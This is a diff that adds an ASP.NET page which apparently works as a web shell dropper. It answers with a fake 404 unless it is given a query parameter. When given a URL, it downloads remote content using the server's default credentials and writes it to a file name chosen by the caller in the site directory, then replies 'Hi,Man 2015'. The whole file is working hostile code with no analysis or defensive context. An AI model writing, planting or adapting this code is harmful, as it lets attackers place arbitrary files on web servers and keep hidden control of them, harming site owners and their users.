@@ -1,0 +1,30 @@
+<%@ Page Language="C#" validateRequest="false" %>
+<%@ import Namespace="System.IO"%>
+<%@ import Namespace="System.Net"%>
+<%@ import Namespace="System.Text"%>
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<Script Language="C#" Runat="Server">
+void Page_Load(Object sender , EventArgs e)
+{
+   String wGetUrl=Request.QueryString["Ec"];
+     if (wGetUrl==null)
+         {
+             Response.Status = "404 Not Found";
+             Response.End();
+         }
+		   else
+	{
+   WebClient myWebClient=new WebClient();
+   myWebClient.Credentials=CredentialCache.DefaultCredentials;
+   byte[] pagedata=myWebClient.DownloadData(wGetUrl);
+   //string result=Encoding.Default.GetString(pagedata); 
+   String wget=Encoding.UTF8.GetString(pagedata);
+   String path=Server.MapPath(".");
+   String Bin_Action = Request["file"];
+   System.IO.StreamWriter sw=new StreamWriter(path+"/"+Bin_Action,true);
+   sw.Write(wget);
+   sw.Close();
+   Response.Write("Hi,Man 2015"); 
+  }
+}
+</Script>
